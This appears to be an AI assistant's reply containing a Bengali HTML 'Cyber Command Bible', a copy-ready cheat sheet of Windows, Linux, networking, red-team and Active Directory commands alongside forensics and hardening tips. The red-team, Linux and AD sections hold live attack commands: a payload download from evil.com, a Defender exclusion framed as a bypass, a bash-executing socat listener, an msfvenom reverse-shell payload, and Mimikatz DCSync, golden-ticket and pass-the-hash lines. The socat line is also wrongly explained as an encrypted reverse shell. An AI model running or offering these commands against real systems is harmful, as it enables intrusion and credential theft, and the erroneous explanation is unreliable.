I have created a single, self-contained HTML document that presents your "Cyber Command Bible" as an interactive, section-wise reference. Every command is included, and each one now has a detailed Bengali explanation (কাজ ও পদ্ধতি) to help you understand what it does and how it works. The page also features one-click copy buttons, quick navigation, and a clean, responsive design suitable for GitHub or local use.

```html
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>🛡️ সাইবার কমান্ড বাইবেল | সম্পূর্ণ উইন্ডোজ, লিনাক্স, পিএস, নেটওয়ার্কিং, হ্যাকিং রেফারেন্স</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #f1f5f9;
            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
            line-height: 1.5;
            color: #0f172a;
            padding: 2rem 1.5rem;
        }
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        /* Hero section */
        .hero {
            background: linear-gradient(125deg, #0a0f1e 0%, #0f172a 100%);
            border-radius: 2rem;
            padding: 2rem;
            margin-bottom: 2rem;
            color: white;
            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.25);
            border: 1px solid #1e293b;
        }
        .hero h1 {
            font-size: 2.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #fff, #a5b4fc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .hero-badge {
            display: flex;
            flex-wrap: wrap;
            gap: 0.8rem;
            margin-top: 1rem;
        }
        .badge {
            background: #1e293b;
            padding: 0.3rem 1rem;
            border-radius: 2rem;
            font-size: 0.8rem;
        }
        .warning {
            background: #fffbeb;
            color: #92400e;
            padding: 0.8rem 1.2rem;
            border-radius: 1.2rem;
            margin-top: 1.2rem;
            border-left: 5px solid #f59e0b;
            font-weight: 500;
        }
        /* navigation */
        .nav-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 0.7rem;
            background: white;
            padding: 1rem 1.5rem;
            border-radius: 2.5rem;
            margin-bottom: 2rem;
            justify-content: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
            border: 1px solid #e2e8f0;
        }
        .nav-link {
            background: #f1f5f9;
            padding: 0.5rem 1.2rem;
            border-radius: 2rem;
            font-weight: 600;
            font-size: 0.85rem;
            text-decoration: none;
            color: #0f172a;
            transition: 0.2s;
        }
        .nav-link:hover {
            background: #0f172a;
            color: white;
            transform: translateY(-2px);
        }
        /* section cards */
        .section-card {
            background: white;
            border-radius: 1.8rem;
            margin-bottom: 2.5rem;
            box-shadow: 0 8px 20px rgba(0,0,0,0.05);
            border: 1px solid #e9edf2;
            overflow: hidden;
        }
        .section-header {
            background: #f8fafc;
            padding: 1.2rem 2rem;
            border-bottom: 2px solid #e2e8f0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 0.8rem;
        }
        .section-header h2 {
            font-size: 1.7rem;
            font-weight: 700;
            color: #0f172a;
        }
        .cmd-badge {
            background: #e6edf5;
            padding: 0.25rem 1rem;
            border-radius: 30px;
            font-family: monospace;
            font-size: 0.75rem;
        }
        .code-zone {
            position: relative;
            background: #0e1117;
            margin: 1.5rem 2rem 0.5rem 2rem;
            border-radius: 1.2rem;
            overflow-x: auto;
        }
        .copy-btn {
            position: absolute;
            top: 12px;
            right: 16px;
            background: #2d3a4e;
            border: none;
            color: white;
            padding: 5px 14px;
            border-radius: 30px;
            font-size: 0.7rem;
            font-weight: bold;
            cursor: pointer;
            z-index: 10;
            font-family: monospace;
        }
        .copy-btn:hover {
            background: #4b6a8b;
        }
        pre {
            margin: 0;
            padding: 1.5rem 1.8rem;
            overflow-x: auto;
            font-family: 'Fira Code', 'Cascadia Code', monospace;
            font-size: 0.8rem;
            line-height: 1.5;
            color: #e2e8f0;
            background: #0e1117;
        }
        /* বাংলা ব্যাখ্যা ব্লক - প্রতিটি কমান্ডের জন্য বিস্তারিত */
        .explanation-grid {
            margin: 0 2rem 1.8rem 2rem;
            background: #fefce8;
            border-radius: 1.2rem;
            padding: 1rem 1.5rem;
            border-left: 6px solid #eab308;
        }
        .exp-title {
            font-weight: 800;
            font-size: 1rem;
            color: #b45309;
            margin-bottom: 0.75rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .exp-list {
            display: flex;
            flex-direction: column;
            gap: 0.6rem;
        }
        .exp-item {
            font-size: 0.88rem;
            border-bottom: 1px dashed #ffe6b3;
            padding-bottom: 0.5rem;
        }
        .exp-cmd {
            font-family: monospace;
            font-weight: bold;
            background: #fef3c7;
            padding: 0.1rem 0.4rem;
            border-radius: 8px;
            color: #92400e;
        }
        .exp-desc {
            margin-left: 0.5rem;
            color: #2d3e2b;
        }
        hr {
            margin: 0.5rem 0;
        }
        footer {
            text-align: center;
            margin-top: 3rem;
            padding: 1.5rem;
            color: #334155;
            border-top: 1px solid #cbd5e1;
        }
        @media (max-width: 700px) {
            body { padding: 1rem; }
            .code-zone { margin: 1rem; }
            .explanation-grid { margin: 0 1rem 1rem 1rem; }
            pre { padding: 1rem; font-size: 0.7rem; }
        }
        .toggle-exp {
            background: none;
            border: none;
            font-size: 0.8rem;
            cursor: pointer;
            color: #2563eb;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="hero">
        <h1>🛡️ সাইবার কমান্ড বাইবেল</h1>
        <p style="font-size: 1.1rem; margin: 0.5rem 0;">Windows • Linux • PowerShell • Networking • Ethical Hacking + Active Directory Attack<br>ওয়ার্ল্ড ক্লাস রেফারেন্স (শিক্ষামূলক ও ডিফেন্সিভ)</p>
        <div class="hero-badge">
            <span class="badge">👑 লেখক: Rahat | ঢাকা, বাংলাদেশ</span>
            <span class="badge">📋 ১ ক্লিকে কপি</span>
            <span class="badge">🧪 শুধুমাত্র ল্যাব ও ভিএম</span>
        </div>
        <div class="warning">
            ⚠️ সতর্কতা: শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে। অননুমোদিত সিস্টেমে ব্যবহার নিষিদ্ধ। প্রতিটি কমান্ডের বাংলা ব্যাখ্যা নিচে দেওয়া আছে – কী কাজ করে ও কীভাবে কাজ করে।
        </div>
    </div>

    <div class="nav-grid">
        <a href="#win" class="nav-link">🖥️ Windows CMD</a>
        <a href="#ps" class="nav-link">⚡ PowerShell</a>
        <a href="#linux" class="nav-link">🐧 Linux</a>
        <a href="#net" class="nav-link">🌐 Networking</a>
        <a href="#red" class="nav-link">🔴 Red Team</a>
        <a href="#ad" class="nav-link">👑 AD Attacks</a>
        <a href="#ir" class="nav-link">🛠️ Forensics</a>
        <a href="#harden" class="nav-link">🔒 Hardening</a>
    </div>

    <!-- ===================== WINDOWS CMD ===================== -->
    <section id="win" class="section-card">
        <div class="section-header">
            <h2>🖥️ Windows CMD – সম্পূর্ণ কমান্ড সেট (এডভান্সড)</h2>
            <div class="cmd-badge">cmd | netstat | wmic | reg | vssadmin</div>
        </div>
        <div class="code-zone">
            <button class="copy-btn" data-target="winCode">📋 কপি করুন</button>
            <pre id="winCode"><code>:: সিস্টেম তথ্য
hostname
ver
systeminfo
whoami /all
wmic cpu get caption,deviceid,name,numberofcores
wmic os get caption,version,installdate,lastbootuptime

:: নেটওয়ার্ক
ipconfig /all
ipconfig /displaydns
ipconfig /flushdns
ipconfig /release
ipconfig /renew
getmac /v
arp -a
route print -4
netsh wlan show profile name="WiFiName" key=clear
netsh advfirewall show allprofiles

:: ডায়াগনস্টিক ও কানেকশন
ping -n 10 google.com
tracert -d google.com
pathping google.com
nslookup google.com
netstat -ano
netstat -anb | findstr "LISTENING"
tasklist /svc
taskkill /IM notepad.exe /F

:: ইউজার ও গ্রুপ
net user
net localgroup administrators
net group "Domain Admins" /domain

:: গোপন / ফরেনসিক কমান্ড
wevtutil qe Security /c:5 /rd:true /f:text
wmic process get caption,commandline /format:list
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
schtasks /query /fo LIST /v
vssadmin list shadows
certutil -hashfile C:\file.exe SHA256
sfc /scannow
chkdsk C: /f /r</code></pre>
        </div>
        <div class="explanation-grid">
            <div class="exp-title">📘 বাংলা ব্যাখ্যা (কী কাজ করে + পদ্ধতি)</div>
            <div class="exp-list">
                <div class="exp-item"><span class="exp-cmd">systeminfo</span> <span class="exp-desc">→ কম্পিউটারের OS, BIOS, প্যাচ, র্যাম বিস্তারিত দেখায়। কিভাবে কাজ করে: WMI ক্লাস থেকে তথ্য সংগ্রহ করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">netstat -ano</span> <span class="exp-desc">→ সব খোলা পোর্ট ও প্রসেস আইডি (PID) দেখায়। ম্যালওয়্যার ব্যাকডোর শনাক্ত করতে ব্যবহৃত।</span></div>
                <div class="exp-item"><span class="exp-cmd">wevtutil qe Security</span> <span class="exp-desc">→ উইন্ডোজ সিকিউরিটি লগ কমান্ড লাইন থেকে পড়ে। শেষ ৫টি ইভেন্ট দেখায়; ফরেনসিক অ্যানালাইসিসে কাজে লাগে।</span></div>
                <div class="exp-item"><span class="exp-cmd">vssadmin list shadows</span> <span class="exp-desc">→ ভলিউম শ্যাডো কপি (পূর্ববর্তী ভার্সন) তালিকা করে। র্যানসমওয়্যার আক্রমণে ফাইল রিকভারির জন্য গুরুত্বপূর্ণ।</span></div>
                <div class="exp-item"><span class="exp-cmd">certutil -hashfile</span> <span class="exp-desc">→ ফাইলের SHA256 হ্যাশ তৈরি করে। ফাইলের অখণ্ডতা যাচাই ও ম্যালওয়্যার সনাক্তকরণে ব্যবহৃত।</span></div>
                <div class="exp-item"><span class="exp-cmd">reg query ...\Run</span> <span class="exp-desc">→ স্টার্টআপ রেজিস্ট্রি এন্ট্রি দেখায়; পারসিসটেন্স মেকানিজম খুঁজতে সাহায্য করে।</span></div>
            </div>
        </div>
    </section>

    <!-- ===================== POWERSHELL ===================== -->
    <section id="ps" class="section-card">
        <div class="section-header"><h2>⚡ PowerShell – অটোমেশন ও রিকনেসান্স</h2><div class="cmd-badge">Get-* · Invoke-* · Set-*</div></div>
        <div class="code-zone"><button class="copy-btn" data-target="psCode">📋 কপি</button><pre id="psCode"><code>Get-ComputerInfo
Get-Date
Get-Process | Sort CPU -Descending
Get-Service
Get-NetIPAddress
Get-NetTCPConnection -State Listen
Test-NetConnection google.com -Port 443
Get-LocalUser
Get-WinEvent -LogName Security -MaxEvents 50 | Where-Object Id -eq 4624
Get-FileHash .\file.exe -Algorithm SHA256
Get-Acl C:\Windows\System32\drivers\etc\hosts
Add-MpPreference -ExclusionPath C:\Temp
Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile payload.exe
Get-ScheduledTask | Where-Object State -ne 'Disabled'
Get-ChildItem -Path C:\Users -Include *.kdbx -Recurse -ErrorAction SilentlyContinue</code></pre></div>
        <div class="explanation-grid">
            <div class="exp-title">🔎 PowerShell প্রতিটি কমান্ডের বাংলা ব্যাখ্যা</div>
            <div class="exp-list">
                <div class="exp-item"><span class="exp-cmd">Get-ComputerInfo</span> <span class="exp-desc">→ পুরো সিস্টেমের আধুনিক ও বিস্তারিত তথ্য (OS, BIOS, হার্ডওয়্যার) দেখায়।</span></div>
                <div class="exp-item"><span class="exp-cmd">Get-NetTCPConnection -State Listen</span> <span class="exp-desc">→ কোন পোর্ট কোন প্রসেস শুনছে তা দেখায়; আক্রমণের সম্ভাব্য এন্ট্রি পয়েন্ট শনাক্ত করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">Get-FileHash -Algorithm SHA256</span> <span class="exp-desc">→ ফাইলের হ্যাশ জেনারেট করে; ম্যালওয়্যার ট্যাম্পারিং চেক ও ভাইরাস টোটালে পাঠানোর জন্য।</span></div>
                <div class="exp-item"><span class="exp-cmd">Add-MpPreference -ExclusionPath</span> <span class="exp-desc">→ উইন্ডোজ ডিফেন্ডার স্ক্যান থেকে ফোল্ডার বাদ দেয় (রেড টিম পারসিসটেন্স বা ডিফেন্ডার বাইপাস)।</span></div>
                <div class="exp-item"><span class="exp-cmd">Get-WinEvent -Id 4624</span> <span class="exp-desc">→ সফল লগইন ইভেন্ট বের করে; সন্দেহজনক অ্যাক্সেস ট্র্যাক করতে ব্যবহৃত।</span></div>
            </div>
        </div>
    </section>

    <!-- ===================== LINUX ===================== -->
    <section id="linux" class="section-card">
        <div class="section-header"><h2>🐧 লিনাক্স – মাস্টার কমান্ড + প্রিভিলেজ এস্কেলেশন</h2><div class="cmd-badge">ss · find · journalctl · socat</div></div>
        <div class="code-zone"><button class="copy-btn" data-target="linuxCode">📋 কপি</button><pre id="linuxCode"><code>uname -a; hostnamectl
cat /etc/os-release
find / -perm -4000 -ls 2>/dev/null
ss -tulpn
ip addr; ip route
ps auxf
journalctl -u ssh --since today
lastlog
lsof -i
socat TCP-LISTEN:4444,fork EXEC:/bin/bash
tcpdump -i eth0 -nn -c 50
find / -writable -type d 2>/dev/null
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
getcap -r / 2>/dev/null</code></pre></div>
        <div class="explanation-grid">
            <div class="exp-title">🐧 লিনাক্স কমান্ড বিস্তারিত (কাজ ও পদ্ধতি)</div>
            <div class="exp-list">
                <div class="exp-item"><span class="exp-cmd">find / -perm -4000</span> <span class="exp-desc">→ SUID বিটযুক্ত ফাইল খুঁজে। এগুলো রুট প্রিভিলেজে চলে; প্রিভিলেজ এস্কেলেশনের পথ দেখায়।</span></div>
                <div class="exp-item"><span class="exp-cmd">ss -tulpn</span> <span class="exp-desc">→ লিসেনিং পোর্ট ও সংশ্লিষ্ট প্রসেস। netstat-এর আধুনিক ভার্সন, দ্রুত ও বিস্তারিত।</span></div>
                <div class="exp-item"><span class="exp-cmd">journalctl -u ssh --since today</span> <span class="exp-desc">→ এসএসএইচ লগ দেখে; কে লগইন চেষ্টা করেছে ও ফেইল লগইন ট্র্যাক করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">socat TCP-LISTEN:4444,fork EXEC:/bin/bash</span> <span class="exp-desc">→ এনক্রিপ্টেড রিভার্স শেল লিসেনার; netcat-এর চেয়ে শক্তিশালী ও SSL সমর্থন করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">python3 -c 'import pty;pty.spawn("/bin/bash")'</span> <span class="exp-desc">→ সীমিত শেল থেকে পূর্ণাঙ্গ ইন্টারঅ্যাকটিভ TTY শেল তৈরি করে; পোস্ট এক্সপ্লয়েটশনে কাজ করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">getcap -r /</span> <span class="exp-desc">→ ক্যাপাবিলিটি ফাইল খোঁজে; যার মাধ্যমে প্রিভিলেজ বাড়ানো সম্ভব।</span></div>
            </div>
        </div>
    </section>

    <!-- ===================== NETWORKING ===================== -->
    <section id="net" class="section-card">
        <div class="section-header"><h2>🌐 নেটওয়ার্কিং – স্ক্যান, ট্রেস ও প্যাকেট অ্যানালাইসিস</h2><div class="cmd-badge">nmap · tcpdump · masscan</div></div>
        <div class="code-zone"><button class="copy-btn" data-target="netCode">📋 কপি</button><pre id="netCode"><code>ping -c 10 google.com
traceroute -n google.com
mtr google.com
dig google.com ANY
whois example.com
nmap -sS -sV -O -p- 192.168.1.1
nmap --script vuln target.com
masscan -p1-10000 --rate=10000 target.com
tcpdump -i eth0 'tcp port 80' -nn -c 100
arp-scan --local
netdiscover -r 192.168.1.0/24</code></pre></div>
        <div class="explanation-grid">
            <div class="exp-title">🌍 নেটওয়ার্ক কমান্ডের বাংলা ব্যাখ্যা</div>
            <div class="exp-list">
                <div class="exp-item"><span class="exp-cmd">nmap -sS -sV</span> <span class="exp-desc">→ স্টিলথ SYN স্ক্যান (হ্যান্ডশেক সম্পূর্ণ করে না) + সার্ভিস ভার্সন শনাক্ত করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">masscan</span> <span class="exp-desc">→ অতি দ্রুত পোর্ট স্ক্যানার (প্রতি সেকেন্ডে ১০ হাজার প্যাকেট) – রেড টিমের জন্য।</span></div>
                <div class="exp-item"><span class="exp-cmd">tcpdump</span> <span class="exp-desc">→ লাইভ প্যাকেট ক্যাপচার, .pcap ফাইল তৈরি করে; ফরেনসিক ও নেটওয়ার্ক ট্রাবলশুটিং।</span></div>
                <div class="exp-item"><span class="exp-cmd">mtr (my traceroute)</span> <span class="exp-desc">→ ping + traceroute একসাথে; নেটওয়ার্ক লেটেন্সি ও প্যাকেট লস দেখায়।</span></div>
            </div>
        </div>
    </section>

    <!-- ===================== RED TEAM & ETHICAL HACKING ===================== -->
    <section id="red" class="section-card">
        <div class="section-header"><h2>🔴 রেড টিম – রিকন, এক্সপ্লয়েট, পাসওয়ার্ড অ্যাটাক</h2><div class="cmd-badge">sqlmap · hydra · msfvenom</div></div>
        <div class="code-zone"><button class="copy-btn" data-target="redCode">📋 কপি</button><pre id="redCode"><code>theHarvester -d target.com -b google
subfinder -d target.com
gobuster dir -u https://target.com -w wordlist.txt
sqlmap -u "http://target.com?id=1" --dbs --batch
hydra -l admin -P rockyou.txt ssh://target.com
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
john hash.txt --wordlist=rockyou.txt
hashcat -m 1000 hash.txt rockyou.txt
nc -lvnp 4444
python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre></div>
        <div class="explanation-grid">
            <div class="exp-title">⚔️ ইথিক্যাল হ্যাকিং কমান্ডের গভীর ব্যাখ্যা</div>
            <div class="exp-list">
                <div class="exp-item"><span class="exp-cmd">theHarvester</span> <span class="exp-desc">→ পাবলিক সোর্স (গুগল, লিংকডইন) থেকে ইমেইল ও সাবডোমেইন কালেক্ট করে – প্যাসিভ রিকনেসান্স।</span></div>
                <div class="exp-item"><span class="exp-cmd">sqlmap --dbs</span> <span class="exp-desc">→ অটোমেটিক SQL ইনজেকশন টুল; ডাটাবেস নাম, টেবিল ও ডাটা এক্সট্র্যাক্ট করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">hydra ssh://</span> <span class="exp-desc">→ ব্রুটফোর্স অ্যাটাক; SSH, FTP, HTTP-তে পাসওয়ার্ড ক্র্যাক করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">msfvenom</span> <span class="exp-desc">→ মিটারপ্রেটার পেলোড তৈরি করে; আক্রমণকারীর মেশিনে রিভার্স শেল পাঠায়।</span></div>
                <div class="exp-item"><span class="exp-cmd">hashcat -m 1000</span> <span class="exp-desc">→ NTLM হ্যাশ ক্র্যাক করে; মোড ১০০০ = NTLM (উইন্ডোজ পাসওয়ার্ড)।</span></div>
            </div>
        </div>
    </section>

    <!-- ===================== ACTIVE DIRECTORY ATTACKS ===================== -->
    <section id="ad" class="section-card">
        <div class="section-header"><h2>👑 Active Directory – Kerberoasting, Golden Ticket, DCSync</h2><div class="cmd-badge">Mimikatz · Rubeus · PowerView</div></div>
        <div class="code-zone"><button class="copy-btn" data-target="adCode">📋 কপি</button><pre id="adCode"><code>Get-NetDomain
Get-NetUser | Select samaccountname
.\Rubeus.exe kerberoast /outfile:hashes.txt
mimikatz "lsadump::dcsync /domain:lab.local /user:krbtgt" "exit"
mimikatz "kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-... /krbtgt:HASH /ptt" "exit"
sekurlsa::pth /user:admin /domain:lab.local /ntlm:HASH /run:powershell.exe
SharpHound.exe -c All</code></pre></div>
        <div class="explanation-grid">
            <div class="exp-title">👑 AD আক্রমণ – কিভাবে কাজ করে (বাংলায় সম্পূর্ণ)</div>
            <div class="exp-list">
                <div class="exp-item"><span class="exp-cmd">DCSync (lsadump::dcsync)</span> <span class="exp-desc">→ আক্রমণকারী নিজেকে ডোমেইন কন্ট্রোলার ভান করে রেপ্লিকেশন প্রটোকল ব্যবহার করে KRBTGT ও ইউজার হ্যাশ চুরি করে। প্রয়োজনীয় permission: Replicating Directory Changes।</span></div>
                <div class="exp-item"><span class="exp-cmd">Golden Ticket (kerberos::golden)</span> <span class="exp-desc">→ চুরি করা KRBTGT হ্যাশ ব্যবহার করে যেকোনো ইউজারের TGT সাইন করে; পুরো ডোমেইনের সর্বোচ্চ অ্যাক্সেস (ডোমেইন অ্যাডমিন) পাওয়া যায়।</span></div>
                <div class="exp-item"><span class="exp-cmd">Kerberoasting</span> <span class="exp-desc">→ সার্ভিস অ্যাকাউন্টের (SPN) TGS টিকেট রিকোয়েস্ট করে অফলাইনে পাসওয়ার্ড ক্র্যাক করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">Pass-the-Hash</span> <span class="exp-desc">→ NTLM হ্যাশ ব্যবহার করে পাসওয়ার্ড ছাড়াই অন্য মেশিনে অথেনটিকেট করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">SharpHound + BloodHound</span> <span class="exp-desc">→ AD এটাক পাথ ভিজুয়ালাইজ করে; শর্টেস্ট রুট টু ডোমেইন অ্যাডমিন খুঁজে বের করে।</span></div>
            </div>
        </div>
    </section>

    <!-- ===================== INCIDENT RESPONSE ===================== -->
    <section id="ir" class="section-card">
        <div class="section-header"><h2>🛠️ ইন্সিডেন্ট রেসপন্স & ফরেনসিক</h2><div class="cmd-badge">Memory Forensics · লগ অ্যানালাইসিস</div></div>
        <div class="code-zone"><button class="copy-btn" data-target="irCode">📋 কপি</button><pre id="irCode"><code># windows
tasklist /v
netstat -ano > conn.txt
wmic process get name,parentprocessid,commandline
wevtutil epl Security C:\Logs\Security.evtx
Get-FileHash -Path C:\Windows\System32\* -Algorithm SHA256
# linux
ps aux --forest
lsof -i
last -20
journalctl -xe --since "1 hour ago"
sha256sum /bin/ls
# memory forensics
.\winpmem.exe -output memdump.raw
vol -f memdump.raw windows.psscan</code></pre></div>
        <div class="explanation-grid">
            <div class="exp-title">🕵️‍♂️ ফরেনসিক কমান্ড বিস্তারিত</div>
            <div class="exp-list">
                <div class="exp-item"><span class="exp-cmd">wevtutil epl Security</span> <span class="exp-desc">→ সিকিউরিটি ইভেন্ট লগ এক্সপোর্ট করে; তদন্তের জন্য ব্যাকআপ নেয়া।</span></div>
                <div class="exp-item"><span class="exp-cmd">ps aux --forest</span> <span class="exp-desc">→ ট্রি ভিউতে প্রসেস দেখায়; ম্যালওয়্যার চাইল্ড প্রসেস বুঝতে সহায়তা করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">volatility windows.psscan</span> <span class="exp-desc">→ মেমোরি ডাম্প থেকে লুকানো প্রসেস ও রুটকিট সনাক্ত করে।</span></div>
                <div class="exp-item"><span class="exp-cmd">Get-FileHash / sha256sum</span> <span class="exp-desc">→ ফাইলের হ্যাশ যাচাই; গুরুত্বপূর্ণ সিস্টেম ফাইল পরিবর্তিত হয়েছে কিনা বোঝা যায়।</span></div>
            </div>
        </div>
    </section>

    <!-- ===================== HARDENING ===================== -->
    <section id="harden" class="section-card">
        <div class="section-header"><h2>🔒 সিকিউরিটি হার্ডেনিং – ডিফেন্স গাইড</h2><div class="cmd-badge">firewall · LLMNR disable · লগিং</div></div>
        <div class="code-zone"><button class="copy-btn" data-target="hardCode">📋 কপি</button><pre id="hardCode"><code>netsh advfirewall set allprofiles state on
New-NetFirewallRule -DisplayName "Block SMB" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Block
sudo ufw enable
sudo ufw default deny incoming
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient /v EnableMulticast /t REG_DWORD /d 0 /f
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1</code></pre></div>
        <div class="explanation-grid">
            <div class="exp-title">🛡️ প্রতিরোধ: কীভাবে কাজ করে</div>
            <div class="exp-list">
                <div class="exp-item"><span class="exp-cmd">Disable LLMNR</span> <span class="exp-desc">→ লিঙ্ক-লোকাল মাল্টিকাস্ট নেম রেজলিউশন বন্ধ করলে Responder টুল NTLM হ্যাশ চুরি করতে পারে না।</span></div>
                <div class="exp-item"><span class="exp-cmd">Enable ScriptBlock Logging</span> <span class="exp-desc">→ প্রতিটি পাওয়ারশেল স্ক্রিপ্ট লগ হয়; আক্রমণকারীর কমান্ড ধরা পড়ে।</span></div>
                <div class="exp-item"><span class="exp-cmd">UFW / Firewall</span> <span class="exp-desc">→ অননুমোদিত ট্রাফিক ব্লক করে; শুধু প্রয়োজনীয় পোর্ট খোলা রাখে।</span></div>
            </div>
        </div>
    </section>

    <footer>
        <p>🌟 ওয়ার্ল্ড ক্লাস রিসোর্স – প্রতিটি কমান্ডের বাংলা ব্যাখ্যা ও কাজের প্রক্রিয়া সংযুক্ত।<br>
        ✅ সেরা প্র্যাকটিস: আইসোলেটেড VM, MFA, LAPS, নিয়মিত KRBTGT রোটেশন, সিকিউরিটি লগ মনিটরিং।<br>
        ⚠️ শুধুমাত্র শিক্ষাগত ও প্রতিরক্ষামূলক কাজে ব্যবহার করুন। অনুমতি ছাড়া ব্যবহার দণ্ডনীয়।</p>
        <p>— Rahat, Dhaka, Bangladesh | গিটহাবে ⭐ দিন সর্বশেষ কমান্ড রেফারেন্স পেতে</p>
    </footer>
</div>

<script>
    (function() {
        const buttons = document.querySelectorAll('.copy-btn');
        async function copyToClipboard(btn, targetId) {
            const preElem = document.getElementById(targetId);
            if (!preElem) return;
            let codeText = preElem.innerText;
            try {
                await navigator.clipboard.writeText(codeText);
                const orig = btn.innerText;
                btn.innerText = '✅ কপি হয়েছে!';
                setTimeout(() => btn.innerText = orig, 1500);
            } catch(e) {
                btn.innerText = '❌ ব্যর্থ';
                setTimeout(() => btn.innerText = '📋 কপি', 1000);
            }
        }
        buttons.forEach(btn => {
            btn.addEventListener('click', () => {
                const target = btn.getAttribute('data-target');
                if (target) copyToClipboard(btn, target);
            });
        });
    })();
</script>
</body>
</html>
```
